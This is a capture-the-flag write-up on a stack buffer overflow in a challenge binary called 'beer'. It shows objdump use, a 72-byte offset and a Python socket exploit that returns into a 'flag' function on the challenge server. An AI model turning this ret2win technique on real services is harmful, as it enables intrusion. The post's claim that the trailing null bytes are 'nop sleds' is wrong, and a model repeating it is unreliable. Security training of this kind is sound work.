This challenge was simple and fun as it involved overflowing beer ;)
![_config.yml]({{ site.baseurl }}/images/bofgit2.png)

As you can already guess by the looks of it, it's a buffer overflow challenge and all we have to do is overflow the stack and get our stack pointer to point to a location in a memory which we can take advantage of.
Let's quckly check if is vulnerable to the attack.
![_config.yml]({{ site.baseurl }}/images/bofgit1.png)

bingo!
We just sent random characters and we go a segmentation fault error!
So all now we have to do are these things:
1. Reverse the ELF and find something to jump upon.
2. Find it's address on stack.
3. Make a python script to pwn the challenge.
There are many ways to do this.  
We can use Ghidra to find what ELF do and what their funcions do. I will just list the functions using objdump.
```
objdump -d beer
```
In the output the function *flag* looks interesting.
![_config.yml]({{ site.baseurl }}/images/gitbof3.png)

Jot down the address of the function and now we have to make simple python script to launch the attack.
How do we create the payload(aka our strings to send in our exploit)?
1. Find the offset and note it down.
2. Use the function address which we just noted down and make the program return to it.  
To find the offset just send bunch of characters and notice at what lenth the program crashes.
Our beer program crashed when we sent more than 72 characters.
![_config.yml]({{ site.baseurl }}/images/gitbof4.png)

As we have already noticed beer is ELF 64-bit LSB executable, so we have to write the address in Little endian format "\x10\x12\x40".
Now we write the exploit.
```python
import socket
buf="A"*72 +"\x10\x12\x40"+"\x00"*5
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("172.105.53.6",32771))
    s.recv(4000)
    print s.recv(1024)
    s.send(buf+"\r\n")
    print s.recv(1024)
    print s.recv(1024)

    
except:
    print "Error try again!"
```
and it worked! The flag was returned. 
If you are wondering what heck are bunch of \x00 in the end, they are just nop sleds.


